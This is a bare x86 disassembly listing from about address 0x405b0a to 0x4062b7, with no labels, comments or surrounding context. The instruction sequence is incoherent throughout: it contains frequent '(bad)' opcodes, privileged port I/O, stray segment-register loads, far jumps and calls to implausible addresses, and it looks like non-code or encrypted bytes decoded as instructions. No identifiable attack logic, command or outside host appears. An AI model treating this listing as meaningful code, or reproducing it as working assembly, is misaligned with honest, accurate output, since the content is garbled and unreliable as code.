  405b0a:	in     eax,0x2e
  405b0c:	jno    0x405b69
  405b0e:	mov    DWORD PTR ds:0xc4e87ecb,esi
  405b14:	pop    ss
  405b15:	les    esi,FWORD PTR [eax+0x73cc88fb]
  405b1b:	xor    ebx,DWORD PTR [ebx-0x5c660f32]
  405b21:	inc    esp
  405b22:	lds    ebx,FWORD PTR [ecx-0x36e84667]
  405b28:	arpl   WORD PTR [edx],si
  405b2a:	push   0x1f
  405b2c:	xchg   ecx,eax
  405b2d:	fisttp WORD PTR [edx]
  405b2f:	div    BYTE PTR [eax]
  405b31:	loop   0x405b17
  405b33:	into   
  405b34:	add    al,0x20
  405b36:	int3   
  405b37:	adc    al,0x8a
  405b39:	add    cl,BYTE PTR [edx+0x2a]
  405b3c:	mov    dl,0xb1
  405b3e:	aas    
  405b3f:	jge    0x405b21
  405b41:	pop    eax
  405b42:	cmp    al,0x98
  405b44:	out    dx,eax
  405b45:	(bad)  
  405b46:	rcl    BYTE PTR [esi],0x2e
  405b49:	or     cl,al
  405b4b:	mov    dl,0x20
  405b4d:	popf   
  405b4e:	dec    esi
  405b4f:	xor    al,0x4c
  405b51:	and    DWORD PTR [edx+0x51],edx
  405b54:	and    BYTE PTR [ebx-0x18],bl
  405b57:	popf   
  405b58:	(bad)  
  405b59:	out    dx,al
  405b5a:	or     al,BYTE PTR [edx-0x9]
  405b5d:	xchg   BYTE PTR [ebx+0x5c],bl
  405b60:	xor    DWORD PTR [edi+0x40],0xffffffcb
  405b64:	popf   
  405b65:	sub    bh,BYTE PTR [ecx-0x78ebfaa]
  405b6b:	stos   BYTE PTR es:[edi],al
  405b6c:	inc    edx
  405b6d:	rol    BYTE PTR [edi],cl
  405b6f:	sub    BYTE PTR [eax],cl
  405b71:	xor    BYTE PTR [esi],ch
  405b73:	ficom  DWORD PTR [esi]
  405b75:	mov    bh,0xf0
  405b77:	pusha  
  405b78:	xor    al,0xd3
  405b7a:	cmc    
  405b7b:	pusha  
  405b7c:	test   eax,0x13d4504d
  405b81:	inc    edx
  405b82:	(bad)  
  405b83:	push   ebp
  405b84:	inc    edx
  405b85:	xchg   ebx,eax
  405b86:	xor    BYTE PTR ds:[edi+0x22],ah
  405b8a:	cmp    dh,BYTE PTR [edi]
  405b8c:	jnp    0x405b8f
  405b8e:	ficom  DWORD PTR [esi]
  405b90:	out    0xee,al
  405b92:	fadd   DWORD PTR [ebp-0x494dc495]
  405b98:	jmp    0x405c14
  405b9a:	mov    dh,0x71
  405b9c:	mov    bh,bh
  405b9e:	imul   eax,DWORD PTR [ebp-0x14f4d16b],0x686bb1f6
  405ba8:	sbb    BYTE PTR [edi-0x71],0xe9
  405bac:	stos   DWORD PTR es:[edi],eax
  405bad:	imul   ebp,DWORD PTR [edx+0xc00ee47],0x68
  405bb4:	dec    edx
  405bb5:	mov    ch,BYTE PTR [esi+0x71a5aaa0]
  405bbb:	clc    
  405bbc:	xlat   BYTE PTR ds:[ebx]
  405bbd:	push   edi
  405bbe:	icebp  
  405bbf:	mov    bl,0x73
  405bc1:	mov    ds:0x1f4db125,al
  405bc6:	xlat   BYTE PTR ds:[ebx]
  405bc7:	int3   
  405bc8:	sbb    DWORD PTR [edx+edi*1],0xffffff9b
  405bcc:	out    0x1f,eax
  405bce:	scas   al,BYTE PTR es:[edi]
  405bcf:	int3   
  405bd0:	xor    edx,edx
  405bd2:	stc    
  405bd3:	sbb    BYTE PTR [esi],cl
  405bd5:	loopne 0x405bd0
  405bd7:	mov    ax,ds:0x33a4c262
  405bdd:	pop    esp
  405bde:	cmp    cl,cl
  405be0:	sbb    al,0x75
  405be2:	(bad)  
  405be3:	jge    0x405baa
  405be5:	pop    eax
  405be6:	call   0xd420903
  405beb:	xor    DWORD PTR ds:0x8d155c10,esi
  405bf1:	idiv   DWORD PTR [ecx]
  405bf3:	adc    edx,DWORD PTR [edi]
  405bf5:	mov    bl,0x9e
  405bf7:	pop    ds
  405bf8:	and    al,0x11
  405bfa:	aas    
  405bfb:	mov    cl,0xa8
  405bfd:	add    al,0xb0
  405bff:	jp     0x405be4
  405c01:	sub    dl,bh
  405c03:	(bad)  
  405c05:	(bad)  
  405c06:	aaa    
  405c07:	out    dx,al
  405c08:	xor    bh,dl
  405c0a:	js     0x405c34
  405c0c:	es popa 
  405c0e:	retf   0xe2e8
  405c11:	lock loop 0x405c06
  405c14:	sti    
  405c15:	cs inc ebp
  405c17:	in     eax,0x92
  405c19:	pop    ebx
  405c1a:	sar    DWORD PTR [edi+0x4eb7a980],1
  405c20:	and    BYTE PTR [ebx+ebp*8+0x50],bh
  405c24:	mov    edi,0x223194c5
  405c29:	mov    bl,al
  405c2b:	cmp    cl,BYTE PTR [edi]
  405c2d:	outs   dx,BYTE PTR ds:[esi]
  405c2e:	xor    DWORD PTR [ebx],ebx
  405c30:	pop    edi
  405c31:	dec    ebp
  405c32:	jno    0x405bd4
  405c34:	sub    BYTE PTR [ebp-0x3e],dl
  405c37:	jl     0x405c9f
  405c39:	lock mov ch,0x2e
  405c3c:	out    dx,eax
  405c3d:	jae    0x405c4b
  405c3f:	inc    ebx
  405c40:	add    al,0x1a
  405c42:	fcom   DWORD PTR [edx-0x46991328]
  405c48:	test   eax,0x770eac2e
  405c4d:	pop    eax
  405c4e:	popf   
  405c4f:	mov    BYTE PTR [eax+0x1756b942],cl
  405c55:	inc    ebx
  405c56:	out    dx,al
  405c57:	jo     0x405c8e
  405c59:	daa    
  405c5a:	enter  0xb9c6,0xb5
  405c5e:	inc    ecx
  405c5f:	push   esp
  405c60:	pop    es
  405c61:	mov    ebx,0x30fe21cb
  405c66:	and    BYTE PTR [eax],ah
  405c68:	jp     0x405caa
  405c6a:	out    dx,al
  405c6b:	push   ecx
  405c6c:	js     0x405c81
  405c6e:	into   
  405c6f:	fsub   QWORD PTR [eax-0x364b379e]
  405c75:	add    esp,0x30
  405c78:	loop   0x405c14
  405c7a:	in     eax,dx
  405c7b:	outs   dx,BYTE PTR ds:[esi]
  405c7c:	and    al,BYTE PTR [edi-0x2a]
  405c7f:	mov    DWORD PTR [ecx],ebp
  405c81:	jg     0x405c1f
  405c83:	xchg   edi,eax
  405c84:	repz call 0x95eee23f
  405c8a:	mov    eax,gs
  405c8c:	push   ebp
  405c8d:	or     al,0x8e
  405c8f:	iret   
  405c90:	jne    0x405c35
  405c92:	ret    0xb4e
  405c95:	sbb    BYTE PTR [ebp+0x71],ch
  405c98:	fsub   QWORD PTR ds:0xb4603d97
  405c9e:	mov    ebp,0x3fbc788f
  405ca3:	ror    DWORD PTR [edx+0x1967a449],cl
  405ca9:	icebp  
  405caa:	pop    ebx
  405cab:	sub    eax,0x594f467c
  405cb0:	aad    0xb9
  405cb2:	cwde   
  405cb3:	xor    BYTE PTR [ebx+ebp*8-0x6054be6b],cl
  405cba:	loopne 0x405cf7
  405cbc:	sub    BYTE PTR [ebp+0x8],dl
  405cbf:	repnz dec ecx
  405cc1:	fdivr  QWORD PTR [ecx+0x169ed377]
  405cc7:	(bad)  
  405cc8:	xchg   esi,eax
  405cc9:	ret    
  405cca:	mov    ebx,0xb33b9500
  405ccf:	mov    esi,DWORD PTR [ebx-0x7ac7b028]
  405cd5:	mov    esi,0x54f05062
  405cda:	cli    
  405cdb:	pop    ebp
  405cdc:	or     eax,0x2c66e0e2
  405ce1:	sti    
  405ce2:	sahf   
  405ce3:	test   DWORD PTR [edi+0x62],ecx
  405ce6:	push   ebx
  405ce7:	sbb    BYTE PTR [edi-0x40],0x81
  405ceb:	(bad)  
  405cec:	fsubr  QWORD PTR [edi+0x9]
  405cef:	or     al,0xe8
  405cf1:	(bad)  
  405cf2:	lods   eax,DWORD PTR ds:[esi]
  405cf3:	pop    esi
  405cf4:	fld    st(7)
  405cf6:	add    eax,0xa9f3f6a4
  405cfb:	lahf   
  405cfc:	mov    esi,0xd04d564c
  405d01:	fdivr  QWORD PTR [edx]
  405d03:	mov    gs,WORD PTR [edx+0x66]
  405d06:	shl    DWORD PTR [edx-0x3f383dde],0x61
  405d0d:	push   eax
  405d0e:	mov    BYTE PTR [ecx-0x22f4ba91],ah
  405d14:	xchg   esi,eax
  405d15:	inc    esp
  405d16:	mov    ds:0xb6531963,eax
  405d1b:	sbb    ebx,DWORD PTR [eax]
  405d1d:	xchg   DWORD PTR [eax],ecx
  405d1f:	fld    DWORD PTR [edx+ecx*8]
  405d22:	and    ecx,ebp
  405d24:	jb     0x405cd8
  405d26:	xor    cl,ch
  405d28:	jne    0x405cde
  405d2a:	(bad)  
  405d2b:	cwde   
  405d2c:	adc    cl,dh
  405d2e:	ja     0x405d3b
  405d30:	arpl   WORD PTR [esi+eax*1-0x4a],ax
  405d34:	aad    0xcd
  405d36:	cmc    
  405d37:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405d38:	repnz aam 0x85
  405d3b:	leave  
  405d3c:	inc    ebp
  405d3d:	mov    DWORD PTR [esi+esi*2-0x4b932cc],0x6d289d58
  405d48:	mov    dl,0xa5
  405d4a:	loopne 0x405d8e
  405d4c:	sub    ebp,DWORD PTR [esi+eax*4]
  405d4f:	xor    DWORD PTR [ecx+0x2],esi
  405d52:	push   ss
  405d53:	shl    BYTE PTR [eax-0x2d3c0192],0xbe
  405d5a:	push   es
  405d5b:	repnz aam 0x4c
  405d5e:	mov    DWORD PTR [edi-0x2db639aa],ebp
  405d64:	pop    ss
  405d65:	aad    0x7d
  405d67:	xor    DWORD PTR [ecx],ebx
  405d69:	and    ebx,DWORD PTR [ecx-0x1]
  405d6c:	stos   DWORD PTR es:[edi],eax
  405d6d:	in     al,dx
  405d6e:	jmp    0xf906d37b
  405d73:	mov    cl,0xb2
  405d75:	inc    ebx
  405d76:	clc    
  405d77:	mov    edx,0x720673e6
  405d7c:	cli    
  405d7d:	sub    BYTE PTR [eax+0x13124b72],0x7d
  405d84:	aad    0xe3
  405d86:	test   al,0x24
  405d89:	into   
  405d8a:	(bad)  
  405d8c:	(bad)  
  405d8d:	xor    eax,0xac4237e
  405d92:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405d93:	xor    eax,0xa56e9d9e
  405d98:	popa   
  405d99:	pop    ebp
  405d9a:	daa    
  405d9b:	fwait
  405d9c:	or     al,0xb7
  405d9e:	aas    
  405d9f:	mov    ch,0xd6
  405da1:	stos   DWORD PTR es:[edi],eax
  405da2:	and    BYTE PTR [ecx-0x8],bl
  405da5:	xor    esp,0x20
  405da8:	mov    ah,0x41
  405daa:	dec    esi
  405dab:	enter  0xd1bb,0xed
  405daf:	(bad)  
  405db0:	xchg   esp,eax
  405db1:	mov    cs,WORD PTR [ebp+0x33681c41]
  405db7:	aas    
  405db8:	dec    eax
  405db9:	cmp    cl,BYTE PTR ds:0x99f62c1c
  405dbf:	xor    al,0xe1
  405dc1:	jae    0x405d8e
  405dc3:	es jae 0x405da9
  405dc6:	mov    ah,0x80
  405dc8:	fs dec eax
  405dca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405dcb:	popf   
  405dcc:	xor    esp,edx
  405dce:	(bad)  
  405dcf:	jg     0x405df1
  405dd1:	daa    
  405dd2:	(bad)  
  405dd3:	(bad)  
  405dd4:	mov    dl,0x80
  405dd6:	stc    
  405dd7:	test   BYTE PTR [edi],ah
  405dd9:	outs   dx,DWORD PTR ds:[esi]
  405dda:	inc    eax
  405ddb:	scas   eax,DWORD PTR es:[edi]
  405ddc:	add    eax,0x25bcdbf
  405de1:	je     0x405e4f
  405de3:	inc    edx
  405de4:	repnz cmp DWORD PTR [edi+0x1139e651],0x7736b6fd
  405def:	fs add al,0x4e
  405df2:	popf   
  405df3:	push   cs
  405df4:	push   ss
  405df5:	pop    eax
  405df6:	add    DWORD PTR [ebx],esi
  405df8:	repz or al,0x3d
  405dfb:	aas    
  405dfc:	fst    QWORD PTR [ebp-0x63]
  405dff:	dec    BYTE PTR [ecx]
  405e01:	jno    0x405e69
  405e03:	mov    bh,0xb1
  405e05:	dec    ecx
  405e06:	sbb    bh,BYTE PTR [ebx+0x8f77a81]
  405e0c:	retf   0x65fe
  405e0f:	outs   dx,DWORD PTR ds:[esi]
  405e10:	fcom   QWORD PTR [edx+eax*2-0x39]
  405e14:	cmp    DWORD PTR [edi-0x4d],esi
  405e17:	sar    DWORD PTR [esi-0x75b82c32],cl
  405e1d:	call   0xce99:0xa2e6498b
  405e24:	inc    edi
  405e25:	bound  edx,QWORD PTR [esi+0x7247c702]
  405e2b:	pusha  
  405e2c:	mov    esi,0xd05323ed
  405e31:	mov    eax,0xf6f72b46
  405e36:	push   es
  405e37:	mov    DWORD PTR [edi+0x3c201491],edi
  405e3d:	(bad)  
  405e3e:	daa    
  405e3f:	pop    ebp
  405e40:	and    eax,0xeda5d4d9
  405e45:	jg     0x405e4e
  405e47:	call   0xefcab9ba
  405e4c:	retf   0xc719
  405e4f:	xor    eax,0x6c8aa96c
  405e54:	pusha  
  405e55:	mov    BYTE PTR [ebx+0x47],bh
  405e58:	xchg   edi,eax
  405e59:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405e5a:	int    0x8d
  405e5c:	sar    DWORD PTR [esi+edi*8+0x210a9f6e],0xd9
  405e64:	xor    BYTE PTR [esi-0x2],al
  405e67:	push   ebp
  405e68:	je     0x405e0d
  405e6a:	add    ch,BYTE PTR [edi+0x760de665]
  405e70:	xor    al,0xa2
  405e72:	adc    DWORD PTR [ebx+esi*4+0x48d3e82f],eax
  405e79:	in     al,0x92
  405e7b:	sar    bl,cl
  405e7d:	ja     0x405e62
  405e7f:	sbb    esp,ebp
  405e81:	xchg   edi,eax
  405e82:	std    
  405e83:	inc    ebp
  405e84:	std    
  405e85:	fnstsw ax
  405e87:	dec    edx
  405e88:	jbe    0x405ed8
  405e8a:	aad    0x51
  405e8c:	jno    0x405e91
  405e8e:	nop
  405e8f:	pop    esp
  405e90:	out    dx,eax
  405e91:	jno    0x405ef2
  405e93:	jo     0x405e58
  405e95:	xor    eax,0x477cbd60
  405e9a:	shr    ebp,0xc2
  405e9d:	and    ecx,ebx
  405e9f:	mov    ds:0x6c4184f0,eax
  405ea4:	push   esi
  405ea5:	cmp    ecx,DWORD PTR [ebp-0x2968b250]
  405eab:	cmp    eax,0x3505366b
  405eb0:	jmp    DWORD PTR [esi]
  405eb2:	jno    0x405e45
  405eb4:	loop   0x405e8d
  405eb6:	ret    
  405eb7:	jns    0x405eee
  405eb9:	pusha  
  405eba:	fwait
  405ebb:	push   esp
  405ebc:	inc    esi
  405ebd:	xchg   edi,eax
  405ebe:	push   cx
  405ec0:	lahf   
  405ec1:	fldenv [edi+0x64ed093f]
  405ec7:	outs   dx,BYTE PTR ds:[esi]
  405ec8:	idiv   BYTE PTR [ecx+edx*8-0x1a1573d6]
  405ecf:	lock and esp,DWORD PTR [edi+0x1a4e1017]
  405ed6:	push   eax
  405ed7:	and    BYTE PTR [ebx+0x14],bl
  405eda:	in     al,0xc8
  405edc:	mov    cl,0x78
  405ede:	fdivr  DWORD PTR [esi-0x3c]
  405ee1:	retf   
  405ee2:	test   BYTE PTR [ebx-0x208b1e81],cl
  405ee8:	sub    al,0x1
  405eea:	out    dx,eax
  405eeb:	xlat   BYTE PTR ds:[ebx]
  405eec:	pushf  
  405eed:	neg    DWORD PTR [esi+edi*8-0x48c33282]
  405ef4:	push   esp
  405ef5:	or     eax,0xcb0af181
  405efa:	adc    al,0x7e
  405efc:	pop    es
  405efd:	jns    0x405f53
  405eff:	and    al,0xd9
  405f01:	mov    ds:0xa76fa30e,eax
  405f06:	dec    edx
  405f07:	inc    esp
  405f08:	cmp    DWORD PTR [edx-0x4bc46dd5],0x2d7a6812
  405f12:	mov    al,ds:0xa3a30224
  405f17:	push   esi
  405f18:	mov    ch,0x67
  405f1a:	and    eax,0xc8d9e211
  405f1f:	not    DWORD PTR [ebp+0x7247f688]
  405f25:	xlat   BYTE PTR ds:[ebx]
  405f26:	pop    ebp
  405f27:	sub    al,0x41
  405f29:	sub    DWORD PTR [edx-0x1947abf5],esp
  405f2f:	test   DWORD PTR [edi],eax
  405f31:	out    0x6a,eax
  405f33:	cmp    DWORD PTR [eax],ebp
  405f35:	test   eax,0xe4577313
  405f3a:	popf   
  405f3b:	xor    BYTE PTR [eax-0x40],bl
  405f3e:	pop    gs
  405f40:	and    al,0xd2
  405f42:	jne    0x405f74
  405f44:	repz jge 0x405fc3
  405f47:	inc    edx
  405f48:	rcr    edx,1
  405f4a:	stos   DWORD PTR es:[edi],eax
  405f4b:	mov    cx,0x66e6
  405f4f:	inc    edx
  405f50:	dec    ebx
  405f51:	rcl    edx,1
  405f53:	adc    al,0x79
  405f55:	push   edi
  405f56:	jle    0x405fa5
  405f58:	iret   
  405f59:	xchg   esp,eax
  405f5a:	xchg   ebx,eax
  405f5b:	pop    ebx
  405f5c:	xchg   esp,eax
  405f5d:	pushf  
  405f5e:	fwait
  405f5f:	pushf  
  405f60:	push   cs
  405f61:	xchg   esi,eax
  405f62:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405f63:	jge    0x405ef4
  405f65:	sub    BYTE PTR [eax],bl
  405f67:	test   eax,0x95c2a8b9
  405f6c:	ret    0x68a9
  405f6f:	xor    eax,0x9ec05584
  405f74:	mul    DWORD PTR [ebp+edi*8+0x498f3b87]
  405f7b:	inc    ebp
  405f7c:	push   ecx
  405f7d:	dec    cx
  405f7f:	jnp    0x405fc2
  405f81:	push   ds
  405f82:	ins    DWORD PTR es:[edi],dx
  405f83:	mov    edx,ebx
  405f85:	cmp    ebx,ebx
  405f87:	pop    ss
  405f88:	push   edx
  405f89:	cmp    BYTE PTR [edi],dl
  405f8b:	adc    cl,BYTE PTR [ebx]
  405f8d:	pop    edx
  405f8e:	cmp    eax,0xcf3e47e5
  405f93:	push   esp
  405f94:	aaa    
  405f95:	inc    ecx
  405f96:	fdiv   st,st(0)
  405f98:	inc    edi
  405f99:	inc    ebp
  405f9a:	mov    ah,0x63
  405f9c:	loop   0x405f66
  405f9e:	xchg   BYTE PTR [ebx-0x184627f7],dl
  405fa4:	jmp    edi
  405fa6:	jmp    0xf3fd:0xce9da18
  405fad:	xor    DWORD PTR [esi-0x68],esi
  405fb0:	sar    DWORD PTR [eax+0x2f],1
  405fb3:	in     eax,0x86
  405fb5:	xor    eax,0xa740439b
  405fba:	sub    eax,0x8a239b83
  405fbf:	nop/reserved BYTE PTR [esi-0x41]
  405fc3:	jl     0x405faa
  405fc5:	mov    ecx,0x41c1befa
  405fca:	mov    edi,0x3bc0284e
  405fcf:	add    eax,0xa038e358
  405fd4:	bsf    ebp,DWORD PTR [edi+ebp*4+0x34]
  405fd9:	fmul   QWORD PTR [ebx-0x7c]
  405fdc:	popf   
  405fdd:	cmp    eax,0xa5601cc4
  405fe2:	push   cs
  405fe3:	adc    edi,edi
  405fe5:	(bad)  
  405fe6:	mov    bh,0xc9
  405fe8:	inc    esp
  405fe9:	icebp  
  405fea:	push   esi
  405feb:	and    eax,0x6b9f2962
  405ff0:	cmp    ebp,DWORD PTR [eax+ebx*4+0x15]
  405ff4:	push   ecx
  405ff5:	arpl   WORD PTR [edi+0x51],dx
  405ff8:	xor    eax,0x25d5b9ec
  405ffd:	pop    ecx
  405ffe:	clc    
  405fff:	aas    
  406000:	push   ecx
  406001:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406002:	rcl    eax,1
  406004:	push   es
  406005:	sti    
  406006:	clc    
  406007:	mov    dh,0x6
  406009:	mov    esi,0xa489c7bb
  40600e:	mov    esp,0xebe773a
  406013:	in     eax,0xb6
  406015:	mov    esp,0x53b4e537
  40601a:	ror    BYTE PTR [ebx],0x8b
  40601d:	rcr    DWORD PTR [edi-0x18],1
  406020:	in     eax,0x26
  406022:	sub    al,0xef
  406024:	and    al,0x85
  406026:	jg     0x406015
  406028:	sub    bh,BYTE PTR [eax+0x1e]
  40602b:	mov    ds:0x9f86ff6e,eax
  406030:	pop    ds
  406031:	lds    ebp,FWORD PTR [esi+eax*4+0x27]
  406035:	sbb    eax,0x2aac6d18
  40603a:	dec    eax
  40603b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40603c:	out    0x35,eax
  40603e:	jp     0x406004
  406040:	popa   
  406041:	ret    
  406042:	arpl   WORD PTR [ebx-0x48a5c522],cx
  406048:	fst    DWORD PTR [esi]
  40604a:	pushf  
  40604b:	stos   BYTE PTR es:[edi],al
  40604c:	mov    al,ds:0x95e89d6a
  406051:	out    dx,eax
  406052:	and    DWORD PTR [ecx+0x35656feb],0x21a84ab0
  40605c:	mov    dl,0xae
  40605e:	scas   al,BYTE PTR es:[edi]
  40605f:	jecxz  0x406095
  406061:	jnp    0x40608f
  406063:	cwde   
  406064:	sub    eax,0xe3ad764f
  406069:	std    
  40606a:	fsqrt  
  40606c:	xor    BYTE PTR [edi+0x27f5195c],al
  406072:	inc    ecx
  406073:	cwde   
  406074:	pop    esi
  406075:	lea    esp,ds:0xf5c9c7e9
  40607b:	mov    ebp,0x84fc0b74
  406080:	jmp    0x406063
  406082:	lods   eax,DWORD PTR ds:[esi]
  406083:	push   ebx
  406084:	cmpxchg DWORD PTR [ecx],ebp
  406087:	das    
  406088:	clc    
  406089:	sti    
  40608a:	int3   
  40608b:	ret    0xb250
  40608e:	sahf   
  40608f:	push   edi
  406090:	jg     0x4060de
  406092:	add    ebx,DWORD PTR [ecx-0x243f2b37]
  406098:	fwait
  406099:	push   ecx
  40609a:	push   cs
  40609b:	mov    cx,0x31b4
  40609f:	xor    BYTE PTR [eax],cl
  4060a1:	sbb    al,0xf
  4060a3:	shr    bl,cl
  4060a5:	pop    ebx
  4060a6:	pushf  
  4060a7:	cmp    cl,bl
  4060a9:	(bad)  
  4060aa:	pop    eax
  4060ab:	push   esp
  4060ac:	jmp    0xcb76:0x567850e8
  4060b3:	stc    
  4060b4:	inc    edx
  4060b5:	push   ss
  4060b6:	not    DWORD PTR [edx]
  4060b8:	fiadd  WORD PTR [esi]
  4060ba:	in     eax,0xc4
  4060bc:	jle    0x406043
  4060be:	add    DWORD PTR [eax+eiz*8-0x2d],edx
  4060c2:	test   eax,0x280da41a
  4060c7:	push   edi
  4060c8:	sbb    edi,DWORD PTR [ecx-0x62]
  4060cb:	mov    dh,0xea
  4060cd:	adc    DWORD PTR [edx+0x48],eax
  4060d0:	pop    ebx
  4060d1:	iret   
  4060d2:	scas   eax,DWORD PTR es:[edi]
  4060d3:	sbb    edi,DWORD PTR [ebp+0xfafe026]
  4060d9:	stc    
  4060da:	out    0xe2,al
  4060dc:	(bad)  
  4060dd:	out    dx,al
  4060de:	cmp    BYTE PTR [esi+0x229b303d],0xe0
  4060e5:	repz sub cl,BYTE PTR [esi-0x59]
  4060e9:	nop
  4060ea:	stos   DWORD PTR es:[edi],eax
  4060eb:	loop   0x40615b
  4060ed:	xor    dl,dh
  4060ef:	pop    ds
  4060f0:	mov    bl,0x34
  4060f2:	mov    esp,DWORD PTR [esi+0x13]
  4060f5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4060f6:	ret    0xae79
  4060f9:	test   BYTE PTR [ecx+eax*8+0x529511d8],bh
  406100:	jmp    0x406171
  406102:	jae    0x406098
  406104:	pop    esi
  406105:	or     edx,eax
  406107:	repz jno 0x4060bd
  40610a:	cmc    
  40610b:	cwde   
  40610c:	aaa    
  40610d:	push   ss
  40610e:	or     DWORD PTR [edi+0x3e3e90],esi
  406114:	xchg   ah,dl
  406116:	dec    ecx
  406117:	ss jbe 0x40616d
  40611a:	push   ds
  40611b:	xchg   esi,eax
  40611c:	jb     0x40614c
  40611e:	gs cmp ebp,ebp
  406121:	add    al,BYTE PTR ds:0xd5e4fe42
  406127:	mov    eax,0xaabd2902
  40612c:	cmp    BYTE PTR [edx+0x34],bh
  40612f:	(bad)  
  406130:	or     ebx,DWORD PTR [eax+0x542eca0b]
  406136:	sahf   
  406137:	sbb    BYTE PTR ss:[edx-0x45],dh
  40613b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40613c:	fmul   QWORD PTR [eax]
  40613e:	sbb    esp,DWORD PTR [edi+0xf3725f4]
  406144:	cld    
  406145:	adc    ebx,DWORD PTR [eax]
  406147:	loopne 0x40614d
  406149:	lock js 0x4061cb
  40614c:	cmovo  ecx,DWORD PTR gs:[ecx]
  406150:	add    eax,0x34fed9f6
  406155:	jmp    0x6103:0xa13e3fb2
  40615c:	pop    ds
  40615d:	push   esi
  40615e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40615f:	jo     0x406114
  406161:	sub    DWORD PTR ds:0x5c75a6d0,ecx
  406167:	adc    eax,0xfbbafd02
  40616c:	xor    ebp,ebp
  40616e:	dec    ebp
  40616f:	pmaxub mm5,QWORD PTR [ecx+0x6c]
  406173:	cs inc edi
  406175:	cwde   
  406176:	stos   DWORD PTR es:[edi],eax
  406177:	fbld   TBYTE PTR [ecx]
  406179:	or     ch,ah
  40617b:	sub    edi,ecx
  40617d:	lods   eax,DWORD PTR ds:[esi]
  40617e:	inc    ecx
  40617f:	loope  0x40617a
  406181:	lea    ecx,[ecx-0x3f]
  406184:	cmp    ah,BYTE PTR [edi]
  406186:	dec    esi
  406187:	loopne 0x4061ec
  406189:	xchg   edx,eax
  40618a:	push   esp
  40618b:	leave  
  40618c:	aad    0x7b
  40618e:	imul   edi,edi,0xca895701
  406194:	and    BYTE PTR [eax+0x5e],ah
  406197:	and    dl,cl
  406199:	xchg   ebx,eax
  40619a:	xor    BYTE PTR [ebx],dl
  40619c:	jge    0x406122
  40619e:	sub    al,0x20
  4061a0:	repz sub eax,0x14e39aea
  4061a6:	(bad)  
  4061a7:	rcl    DWORD PTR ds:0xae2e4651,1
  4061ad:	in     eax,dx
  4061ae:	push   cs
  4061af:	jge    0x406193
  4061b1:	fisub  WORD PTR [edi+0x5b]
  4061b4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4061b5:	sti    
  4061b6:	icebp  
  4061b7:	ret    
  4061b8:	jge    0x4061b9
  4061ba:	mov    eax,ds:0x6953cbf1
  4061bf:	pop    es
  4061c0:	jo     0x406177
  4061c2:	retf   0x1833
  4061c5:	jo     0x406236
  4061c7:	cli    
  4061c8:	jmp    0x4061b0
  4061ca:	jmp    0x406207
  4061cc:	adc    ch,BYTE PTR [esi+0x74]
  4061cf:	call   0x780e53c4
  4061d4:	loop   0x4061a9
  4061d6:	call   0x6160424d
  4061db:	inc    eax
  4061dc:	(bad)  [edx+0x45]
  4061df:	push   ecx
  4061e0:	addr16 jnp 0x40620b
  4061e3:	fdivrp st(3),st
  4061e5:	mov    es,ebp
  4061e7:	pop    ds
  4061e8:	inc    ecx
  4061e9:	enter  0xf01f,0x8a
  4061ed:	les    esp,FWORD PTR [esi-0x7d]
  4061f0:	cmp    ch,BYTE PTR [edx]
  4061f2:	mov    ebp,0xb9d98926
  4061f7:	push   0x32
  4061f9:	(bad)  
  4061fa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4061fb:	xor    eax,0x2602b171
  406200:	mov    ebp,0xf85c9bc6
  406205:	push   es
  406206:	xor    dl,BYTE PTR [esi-0x1c98d6f5]
  40620c:	pusha  
  40620d:	ins    DWORD PTR es:[edi],dx
  40620e:	repnz lods al,BYTE PTR fs:[esi]
  406211:	(bad)  
  406212:	arpl   WORD PTR [esi],si
  406214:	add    eax,0xeae83b5
  406219:	jg     0x406253
  40621b:	inc    ebx
  40621c:	pop    ebx
  40621d:	imul   esp,ebp,0xffffff89
  406220:	or     edx,DWORD PTR [eax-0x11]
  406223:	sar    DWORD PTR [ecx-0x5b],cl
  406226:	in     eax,0xa4
  406228:	xor    al,BYTE PTR [ebx-0x29]
  40622b:	sti    
  40622c:	pushf  
  40622d:	js     0x406254
  40622f:	daa    
  406230:	arpl   sp,si
  406232:	pop    ebx
  406233:	cmp    al,0xfa
  406235:	jae    0x4061c3
  406237:	test   BYTE PTR [edi+0x37],ah
  40623a:	inc    ebx
  40623b:	mov    al,0x66
  40623d:	pusha  
  40623e:	cs pop edi
  406240:	retf   0xe73a
  406243:	pop    ecx
  406244:	call   0x71b7d099
  406249:	mov    ds:0x540e00f2,al
  40624e:	or     BYTE PTR [ebp+eax*8-0x2f04c0c1],0xb3
  406256:	leave  
  406257:	jle    0x4062d4
  406259:	shl    DWORD PTR [eax+0x43],1
  40625c:	pop    edi
  40625d:	into   
  40625e:	dec    esi
  40625f:	popa   
  406260:	fwait
  406261:	sub    ah,ch
  406263:	adc    cl,BYTE PTR [ebx-0x4e]
  406266:	ins    DWORD PTR es:[edi],dx
  406267:	and    BYTE PTR ds:0x461d7830,ch
  40626d:	lock sub al,BYTE PTR [ebp+0x5]
  406271:	sti    
  406272:	mov    esp,DWORD PTR [edx+0x494d6ba]
  406278:	mov    ds:0xb3491966,eax
  40627d:	push   eax
  40627e:	aad    0x61
  406280:	repz push edx
  406282:	jecxz  0x4062f8
  406284:	mov    ah,0x3d
  406286:	inc    DWORD PTR [ecx]
  406288:	pop    edi
  406289:	inc    ebp
  40628a:	jecxz  0x4062e2
  40628c:	xor    BYTE PTR [edi+0x22],ah
  40628f:	sbb    DWORD PTR [edx+0x2afe8295],0xa
  406296:	fs and al,0xe2
  406299:	mov    al,BYTE PTR [edi+ebx*1-0x601c9cfb]
  4062a0:	loop   0x406273
  4062a2:	jg     0x40630b
  4062a4:	(bad)  
  4062a5:	fist   WORD PTR [edx+ebp*2+0x59]
  4062a9:	jmp    edi
  4062ab:	jg     0x40627b
  4062ad:	mov    BYTE PTR [ebx-0x457b68dc],ch
  4062b3:	cdq    
  4062b4:	cld    
  4062b5:	out    0xad,al
  4062b7:	mov    dh,0xfe
